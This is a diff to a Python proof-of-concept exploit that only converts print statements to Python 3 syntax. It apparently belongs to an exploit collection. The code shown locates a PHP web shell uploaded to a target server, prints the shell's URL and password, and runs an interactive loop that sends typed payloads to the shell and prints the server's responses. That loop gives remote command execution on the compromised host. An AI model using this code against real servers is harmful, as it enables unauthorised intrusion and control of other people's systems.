@@ -20,8 +20,8 @@ def poc():
 		p = re.compile("(?<=preview\/)(.*)(php)")
 		shellName = re.search(p, json.loads(r.text)['result']).group(0)
 		shell = target.url.replace("index.php","preview/") + shellName
-		print "[*] The shell url: " + shell
-		print "[*] The shell password: " + password
+		print("[*] The shell url: " + shell)
+		print("[*] The shell password: " + password)
 
 		while 1:
 			try:
@@ -32,11 +32,11 @@ def poc():
 						password : payload
 					}
 					r = requests.post(shell, data=postdata)
-					print r.text.encode(r.encoding)
+					print(r.text.encode(r.encoding))
 				else:
 					break
 			except EOFError as e:
-				print "[*] type 'exit' to quit"
+				print("[*] type 'exit' to quit")
 				pass
 	except (KeyError,IndexError) as e:
 		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
